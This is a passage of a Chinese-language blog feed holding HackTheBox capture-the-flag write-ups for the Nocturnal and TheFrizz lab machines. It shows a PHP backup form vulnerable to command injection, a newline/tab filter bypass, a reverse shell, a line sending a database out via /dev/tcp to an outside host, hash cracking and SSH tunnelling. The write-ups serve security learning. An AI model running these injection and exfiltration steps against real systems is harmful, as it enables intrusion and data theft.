class="hljs-comment">#e7f5e6;</span><br>            color: <span class="hljs-comment">#2d7b40;</span><br>            font-weight: <span class="hljs-number">500</span>;<br>        &#125;<br><br>        .error &#123;<br>            background-color: <span class="hljs-comment">#f8d7da;</span><br>            color: <span class="hljs-comment">#842029;</span><br>        &#125;<br><br>        .backup-output &#123;<br>            margin-top: <span class="hljs-number">20</span>px;<br>            padding: <span class="hljs-number">15</span>px;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#555;</span><br>            border-radius: <span class="hljs-number">8</span>px;<br>            background-color: <span class="hljs-comment">#333;</span><br>            color: <span class="hljs-comment">#ff8c00;</span><br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">container</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h1</span>&gt;<span class="hljs-title">Admin</span> <span class="hljs-title">Panel</span>&lt;/<span class="hljs-title">h1</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;<span class="hljs-title">File</span> <span class="hljs-title">Structure</span> (<span class="hljs-title">PHP</span> <span class="hljs-title">Files</span> <span class="hljs-title">Only</span>)&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span> <span class="hljs-title">listPhpFiles</span>(<span class="hljs-title">__DIR__</span>); ?&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;<span class="hljs-title">View</span> <span class="hljs-title">File</span> <span class="hljs-title">Content</span>&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> (<span class="hljs-title">isset</span>($<span class="hljs-title">content</span>)) </span>&#123; <span class="hljs-meta">?&gt;</span><br>            &lt;pre&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>; <span class="hljs-meta">?&gt;</span>&lt;/pre&gt;<br>        <span class="hljs-meta">&lt;?php</span> &#125; <span class="hljs-meta">?&gt;</span><br><br>        &lt;h2&gt;Create Backup&lt;/h2&gt;<br>        &lt;form method=<span class="hljs-string">&quot;POST&quot;</span>&gt;<br>            &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;Enter Password to Protect Backup:&lt;/label&gt;<br>            &lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> required placeholder=<span class="hljs-string">&quot;Enter backup password&quot;</span>&gt;<br>            &lt;button type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;backup&quot;</span>&gt;Create Backup&lt;/button&gt;<br>        &lt;/form&gt;<br><br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">backup</span>-<span class="hljs-title">output</span>&quot;&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">if</span> (<span class="hljs-title">isset</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">backup</span>&#x27;]) &amp;&amp; !<span class="hljs-title">empty</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">password</span>&#x27;])) </span>&#123;<br>    <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">cleanEntry</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$backupFile</span> = <span class="hljs-string">&quot;backups/backup_&quot;</span> . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>) . <span class="hljs-string">&quot;.zip&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$password</span> === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;error-message&#x27;&gt;Error: Try another password.&lt;/div&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$logFile</span> = <span class="hljs-string">&#x27;/tmp/backup_&#x27;</span> . <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.log&#x27;</span>;<br>       <br>        <span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;zip -x &#x27;./backups/*&#x27; -r -P &quot;</span> . <span class="hljs-variable">$password</span> . <span class="hljs-string">&quot; &quot;</span> . <span class="hljs-variable">$backupFile</span> . <span class="hljs-string">&quot; .  &gt; &quot;</span> . <span class="hljs-variable">$logFile</span> . <span class="hljs-string">&quot; 2&gt;&amp;1 &amp;&quot;</span>;<br>        <br>        <span class="hljs-variable">$descriptor_spec</span> = [<br>            <span class="hljs-number">0</span> =&gt; [<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>], <span class="hljs-comment">// stdin</span><br>            <span class="hljs-number">1</span> =&gt; [<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-variable">$logFile</span>, <span class="hljs-string">&quot;w&quot;</span>], <span class="hljs-comment">// stdout</span><br>            <span class="hljs-number">2</span> =&gt; [<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-variable">$logFile</span>, <span class="hljs-string">&quot;w&quot;</span>], <span class="hljs-comment">// stderr</span><br>        ];<br><br>        <span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$descriptor_spec</span>, <span class="hljs-variable">$pipes</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br>        &#125;<br><br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$logContents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$logFile</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$logContents</span>, <span class="hljs-string">&#x27;zip error&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;backup-success&#x27;&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Backup created successfully.&lt;/p&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$backupFile</span>) . <span class="hljs-string">&quot;&#x27; class=&#x27;download-button&#x27; download&gt;Download Backup&lt;/a&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Output:&lt;/h3&gt;&lt;pre&gt;&quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$logContents</span>) . <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;error-message&#x27;&gt;Error creating the backup.&lt;/div&gt;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$logFile</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;/div&gt;<br>        <br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backupMessage</span>)) &#123; <span class="hljs-meta">?&gt;</span><br>            &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">message</span>&quot;&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">backupMessage</span>; ?&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span> &#125; ?&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181739133.png" alt="image-20250418173927028"></p><p>$commandä¸­å¯†ç æ˜¯å¯æ§çš„ã€‚åŒæ—¶ä¹Ÿå¯¹å¯†ç åšäº†ä»¥ä¸‹çš„é™åˆ¶ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181740248.png" alt="image-20250418174023157"></p><p>åˆ©ç”¨%0aå’Œ%09è¿›è¡Œç»•è¿‡ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181815317.png" alt="image-20250418181506022"></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">é¦–å…ˆä¸Šä¼ ä¸€ä¸ª<span class="hljs-keyword">sh</span>åå¼¹<span class="hljs-keyword">shell</span>çš„æ–‡ä»¶ï¼Œç„¶åå†bash xxx.<span class="hljs-keyword">sh</span>æ‰§è¡Œä¸€ä¸‹<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181851974.png" alt="image-20250418185101884"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181851256.png" alt="image-20250418185108192"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>  <span class="hljs-regexp">//</span>äº¤äº’æ€§shell<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181859673.png" alt="image-20250418185944467"></p><p>æ‰¾åˆ°ä¸€ä¸ªdbæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚</p><h2 id="sshå¯†ç çˆ†ç ´"><a href="#sshå¯†ç çˆ†ç ´" class="headerlink" title="sshå¯†ç çˆ†ç ´"></a>sshå¯†ç çˆ†ç ´</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat nocturnal_database.db &gt; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.10.14.89/</span><span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181902933.png" alt="image-20250418190253854"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181903681.png" alt="image-20250418190303608"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181918838.png" alt="image-20250418191810578"></p><p>homeç›®å½•ä¸‹çš„æ˜¯tobiasç”¨æˆ·ï¼Œè§£ä¸€ä¸‹è¿™ä¸ªå¯†ç ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john --format=raw-md5 --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt <span class="hljs-number">1</span>.txt <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181923532.png" alt="image-20250418192350442"></p><p>sshç›´æ¥ç™»å½•ã€‚æ¥ç€è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå†…ç½‘æœ‰ä¸ª8080ç«¯å£ã€‚</p><h2 id="ispconfigææƒ"><a href="#ispconfigææƒ" class="headerlink" title="ispconfigææƒ"></a>ispconfigææƒ</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181947120.png" alt="image-20250418194708034"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181947568.png" alt="image-20250418194745491"></p><p>åŒæ—¶å†wwwç›®å½•ä¸‹å‘ç°ä¸€ä¸ªispconfigï¼Œåº”è¯¥å°±æ˜¯è¿™ä¸ªæœåŠ¡äº†ï¼Œç«¯å£æ˜ å°„ä¸€ä¸‹çœ‹çœ‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181943040.png" alt="image-20250418194354815"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8888</span>:<span class="hljs-number">127.0.0.1:8080</span> tobias@<span class="hljs-number">10.10.11.64</span> <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181951945.png" alt="image-20250418195153818"></p><p>æœç„¶æ˜¯é‚£ä¸ªæœåŠ¡ã€‚</p><p>githubä¸Šæ‰¾åˆ°åˆ©ç”¨çš„expã€‚</p><p><a href="https://github.com/ajdumanhug/CVE-2023-46818">https://github.com/ajdumanhug/CVE-2023-46818</a></p><p>å®ƒè¿™ä¸ªåå°çš„ç”¨æˆ·åæ˜¯admin å¯†ç çš„è¯æ˜¯ä¹‹å‰çˆ†ç ´å‡ºæ¥çš„sshçš„å¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504182002717.png" alt="image-20250418200204611"></p>]]></content>
    
    
    <categories>
      
      <category>Linuxé¶æœºåˆçº§</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-TheFrizz</title>
    <link href="/2025/04/12/HTB-TheFrizz/"/>
    <url>/2025/04/12/HTB-TheFrizz/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-TheFrizz"><a href="#HTB-TheFrizz" class="headerlink" title="HTB-TheFrizz"></a>HTB-TheFrizz</h1><h2 id="ä¿¡æ¯æ”¶é›†ï¼š"><a href="#ä¿¡æ¯æ”¶é›†ï¼š" class="headerlink" title="ä¿¡æ¯æ”¶é›†ï¼š"></a>ä¿¡æ¯æ”¶é›†ï¼š</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rustscan</span> -a <span class="hljs-number">10.10.11.60</span> --range <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -- -sV<span class="hljs-meta"></span><br><span class="hljs-meta">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="hljs-meta">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. </span><br><span class="hljs-meta">Open 10.10.11.60:22</span><br><span class="hljs-meta">Open 10.10.11.60:53</span><br><span class="hljs-meta">Open 10.10.11.60:80</span><br><span class="hljs-meta">Open 10.10.11.60:88</span><br><span class="hljs-meta">Open 10.10.11.60:135</span><br><span class="hljs-meta">Open 10.10.11.60:139</span><br><span class="hljs-meta">Open 10.10.11.60:389</span><br><span class="hljs-meta">Open 10.10.11.60:445</span><br><span class="hljs-meta">Open 10.10.11.60:464</span><br><span class="hljs-meta">Open 10.10.11.60:593</span><br><span class="hljs-meta">Open 10.10.11.60:636</span><br><span class="hljs-meta">Open 10.10.11.60:3268</span><br><span class="hljs-meta">Open 10.10.11.60:3269</span><br><span class="hljs-meta">Open 10.10.11.60:9389</span><br><span class="hljs-meta">Open 10.10.11.60:49664</span><br><span class="hljs-meta">Open 10.10.11.60:49668</span><br><span class="hljs-meta">Open 10.10.11.60:49670</span><br><span class="hljs-meta">Open 10.10.11.60:56427</span><br><span class="hljs-meta">Open 10.10.11.60:56418</span><br><span class="hljs-meta">Open 10.10.11.60:56414</span><br><span class="hljs-meta">[~] Starting Nmap</span><br><span class="hljs-meta">[&gt;] The Nmap command to be run is nmap -sV -vvv -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49668,49670,56427,56418,56414 10.10.11.60</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-12 04:01 UTC</span><br><span class="hljs-meta">NSE: Loaded 46 scripts for scanning.</span><br><span class="hljs-meta">Initiating Ping Scan at 04:01</span><br><span class="hljs-meta">Scanning 10.10.11.60 [4 ports]</span><br><span class="hljs-attribute">Completed</span> Ping Scan at <span class="hljs-number">04</span>:<span class="hljs-number">01</span>, <span class="hljs-number">1</span>.<span class="hljs-number">78</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br><span class="hljs-attribute">Initiating</span> SYN Stealth Scan at <span class="hljs-number">04</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">Scanning</span> frizzdc.frizz.htb (<span class="hljs-number">10.10.11.60</span>)<span class="hljs-meta"> [20 ports]</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">53</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">139</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">22</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">56427</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">445</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">80</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">135</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">389</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">593</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">636</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">56414</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">49670</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">464</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">49668</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">9389</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">3269</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">56418</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">3268</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">49664</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">88</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.60</span><br><span class="hljs-attribute">Completed</span> SYN Stealth Scan at <span class="hljs-number">04</span>:<span class="hljs-number">01</span>, <span class="hljs-number">0</span>.<span class="hljs-number">61</span>s elapsed (<span class="hljs-number">20</span> total ports)<br><span class="hljs-attribute">Initiating</span> Service scan at <span class="hljs-number">04</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">Scanning</span> <span class="hljs-number">20</span> services <span class="hljs-literal">on</span> frizzdc.frizz.htb (<span class="hljs-number">10.10.11.60</span>)<br><span class="hljs-attribute">Completed</span> Service scan at <span class="hljs-number">04</span>:<span class="hljs-number">02</span>, <span class="hljs-number">57</span>.<span class="hljs-number">89</span>s elapsed (<span class="hljs-number">20</span> services <span class="hljs-literal">on</span> <span class="hljs-number">1</span> host)<br><span class="hljs-attribute">NSE</span>: Script scanning <span class="hljs-number">10.10.11.60</span>.<br><span class="hljs-attribute">NSE</span>: Starting runlevel <span class="hljs-number">1</span> (of <span class="hljs-number">2</span>) scan.<br><span class="hljs-attribute">Initiating</span> NSE at <span class="hljs-number">04</span>:<span class="hljs-number">02</span><br><span class="hljs-attribute">Completed</span> NSE at <span class="hljs-number">04</span>:<span class="hljs-number">02</span>, <span class="hljs-number">1</span>.<span class="hljs-number">21</span>s elapsed<br><span class="hljs-attribute">NSE</span>: Starting runlevel <span class="hljs-number">2</span> (of <span class="hljs-number">2</span>) scan.<br><span class="hljs-attribute">Initiating</span> NSE at <span class="hljs-number">04</span>:<span class="hljs-number">02</span><br><span class="hljs-attribute">Completed</span> NSE at <span class="hljs-number">04</span>:<span class="hljs-number">02</span>, <span class="hljs-number">1</span>.<span class="hljs-number">08</span>s elapsed<br><span class="hljs-attribute">Nmap</span> scan report for frizzdc.frizz.htb (<span class="hljs-number">10.10.11.60</span>)<br><span class="hljs-attribute">Host</span> is up, received echo-reply ttl <span class="hljs-number">127</span> (<span class="hljs-number">0</span>.<span class="hljs-number">42</span>s latency).<br><span class="hljs-attribute">Scanned</span> at <span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">12</span> <span class="hljs-number">04</span>:<span class="hljs-number">01</span>:<span class="hljs-number">39</span> UTC for <span class="hljs-number">61</span>s<br><br><span class="hljs-attribute">PORT</span>      STATE SERVICE       REASON          VERSION<br><span class="hljs-attribute">22</span>/tcp    open  ssh           syn-ack ttl <span class="hljs-number">127</span> OpenSSH for_Windows_9.<span class="hljs-number">5</span> (protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">53</span>/tcp    open  domain        syn-ack ttl <span class="hljs-number">127</span> Simple DNS Plus<br><span class="hljs-attribute">80</span>/tcp    open  http          syn-ack ttl <span class="hljs-number">127</span> Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">58</span> (OpenSSL/<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span> PHP/<span class="hljs-number">8</span>.<span class="hljs-number">2</span>.<span class="hljs-number">12</span>)<br><span class="hljs-attribute">88</span>/tcp    open  kerberos-sec  syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows Kerberos (server time: <span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">12</span> <span class="hljs-number">10</span>:<span class="hljs-number">42</span>:<span class="hljs-number">29</span>Z)<br><span class="hljs-attribute">135</span>/tcp   open  msrpc         syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows RPC<br><span class="hljs-attribute">139</span>/tcp   open  netbios-ssn   syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows netbios-ssn<br><span class="hljs-attribute">389</span>/tcp   open  ldap          syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)<br><span class="hljs-attribute">445</span>/tcp   open  microsoft-ds? syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-attribute">464</span>/tcp   open  kpasswd5?     syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-attribute">593</span>/tcp   open  ncacn_http    syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows RPC over HTTP <span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">636</span>/tcp   open  tcpwrapped    syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-attribute">3268</span>/tcp  open  ldap          syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)<br><span class="hljs-attribute">3269</span>/tcp  open  tcpwrapped    syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-attribute">9389</span>/tcp  open  mc-nmf        syn-ack ttl <span class="hljs-number">127</span> .NET Message Framing<br><span class="hljs-attribute">49664</span>/tcp open  msrpc         syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows RPC<br><span class="hljs-attribute">49668</span>/tcp open  msrpc         syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows RPC<br><span class="hljs-attribute">49670</span>/tcp open  ncacn_http    syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows RPC over HTTP <span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">56414</span>/tcp open  msrpc         syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows RPC<br><span class="hljs-attribute">56418</span>/tcp open  msrpc         syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows RPC<br><span class="hljs-attribute">56427</span>/tcp open  msrpc         syn-ack ttl <span class="hljs-number">127</span> Microsoft Windows RPC<br><span class="hljs-attribute">Service</span> Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br><span class="hljs-attribute">Read</span> data files from: /usr/bin/../share/nmap<br><span class="hljs-attribute">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-attribute">Nmap</span> done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">63</span>.<span class="hljs-number">41</span> seconds<br>           <span class="hljs-attribute">Raw</span> packets sent: <span class="hljs-number">24</span> (<span class="hljs-number">1</span>.<span class="hljs-number">032</span>KB) | Rcvd: <span class="hljs-number">21</span> (<span class="hljs-number">908</span>B)<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504121554372.png" alt="image-20250412155439189"></p><p>è¿™æ˜¯ä¸€ä¸ªGibbon(Gibbon æ˜¯ç”±æ•™å¸ˆåˆ›å»ºçš„å­¦æ ¡å¹³å°ï¼Œæ—¨åœ¨è§£å†³æ•™è‚²å·¥ä½œè€…æ¯å¤©é‡åˆ°çš„å®é™…é—®é¢˜.) ç‰ˆæœ¬æ˜¯25.0.00</p><h2 id="CVE-2023-45878"><a href="#CVE-2023-45878" class="headerlink" 